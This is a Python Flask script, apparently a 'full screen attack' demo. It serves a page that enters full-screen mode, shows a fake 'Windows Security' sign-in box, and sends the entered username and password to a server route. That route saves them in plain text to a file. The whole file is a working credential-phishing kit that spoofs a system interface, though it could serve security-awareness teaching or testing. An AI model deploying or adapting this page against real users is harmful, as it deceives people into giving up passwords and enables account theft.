#!/usr/bin/env python3

from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Full Screen Attack Demo</title>
  <style>
    body, html {
      margin: 0; 
      padding: 0; 
      height: 100%; 
      width: 100%;
      font-family: Arial, sans-serif;
    }
    #container {
      text-align: center;
      padding-top: 50px;
    }
    #enter-btn {
      margin-top: 100px;
      padding: 20px;
      font-size: 1.2em;
      cursor: pointer;
    }
    /* Hidden login form styles */
    #fake-login-container {
      display: none;
      height: 100%;
      width: 100%;
      background: #f0f0f0;
      align-items: center;
      justify-content: center;
    }
    #login-box {
      margin: auto;
      background: #ffffff;
      border: 1px solid #ccc;
      padding: 30px;
      border-radius: 5px;
      text-align: center;
    }
    #login-box h2 {
      margin-top: 0;
    }
    #login-box input[type="text"],
    #login-box input[type="password"] {
      width: 200px;
      margin: 10px 0;
      padding: 8px;
      font-size: 1em;
    }
    #login-box button {
      padding: 10px 20px;
      font-size: 1em;
      cursor: pointer;
    }
    #success-message {
      display: none;
      text-align: center;
      color: #fff;
      background: #222;
      height: 100%;
      width: 100%;
      padding-top: 40vh;
      font-size: 1.5em;
    }
  </style>
</head>
<body>
  <div id="container">
    <h1>Full Screen Attack Demonstration</h1>
    <p>This page will attempt to go full screen to mimic a system interface.</p>
    <button id="enter-btn" onclick="goFullScreen()">Enter Full Screen</button>
  </div>

  <!-- Fake Login Container -->
  <div id="fake-login-container">
    <div id="login-box">
      <h2>Windows Security</h2>
      <p>Please enter your credentials to continue</p>
      <form id="credsForm" onsubmit="captureCreds(event)">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Sign In</button>
      </form>
      <p>(Press ESC to exit full screen)</p>
    </div>
  </div>

  <!-- Success Message -->
  <div id="success-message">
    <h1>Credentials Received</h1>
    <p>You can press ESC to exit full screen mode.</p>
  </div>

  <script>
    function goFullScreen() {
      const docElm = document.documentElement;
      if (docElm.requestFullscreen) {
        docElm.requestFullscreen();
      } else if (docElm.mozRequestFullScreen) {
        docElm.mozRequestFullScreen();
      } else if (docElm.webkitRequestFullscreen) {
        docElm.webkitRequestFullscreen();
      } else if (docElm.msRequestFullscreen) {
        docElm.msRequestFullscreen();
      }

      // Hide the initial container, show the fake login
      document.getElementById('container').style.display = 'none';
      document.getElementById('fake-login-container').style.display = 'flex';
    }

    function captureCreds(e) {
      e.preventDefault();
      const form = document.getElementById('credsForm');
      const formData = new FormData(form);
      const username = formData.get('username');
      const password = formData.get('password');

      // Send the credentials to the server via fetch (AJAX)
      fetch("/capture_creds", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      })
      .then(response => {
        if (response.ok) {
          // Hide login container, show success message
          document.getElementById('fake-login-container').style.display = 'none';
          document.getElementById('success-message').style.display = 'block';
        }
      })
      .catch(err => console.error(err));
    }
  </script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_PAGE)

@app.route("/capture_creds", methods=["POST"])
def capture_creds():
    """
    Receives credentials in JSON via fetch() and appends them to fullscreen_creds.txt
    """
    import json
    data = request.get_data(as_text=True)
    try:
        creds = json.loads(data)
        username = creds.get("username", "")
        password = creds.get("password", "")
        with open("fullscreen_creds.txt", "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")
    except:
        pass
    
    return "", 200  # Return empty 200 response

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)